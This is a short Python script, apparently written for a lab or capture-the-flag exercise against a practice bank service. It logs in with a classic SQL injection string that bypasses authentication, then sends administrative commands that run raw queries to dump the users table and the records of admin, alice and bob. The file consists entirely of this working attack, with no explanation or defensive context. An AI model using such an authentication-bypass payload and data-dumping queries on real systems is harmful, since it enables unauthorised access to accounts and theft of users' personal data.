# attack_admin_sql.py
from bank_client import BankClient

c = BankClient()

print("LOGIN:", c.cmd("LOGIN ' OR '1'='1 x"))

queries = [
    "SELECT * FROM users",
    "SELECT * FROM users WHERE login = 'admin'",
    "SELECT * FROM users WHERE login = 'alice'",
    "SELECT * FROM users WHERE login = 'bob'",
]

for q in queries:
    print(f"\n--- {q}")
    resp = c.cmd(f"ADMIN {q}")
    print(resp[:400])

c.close()
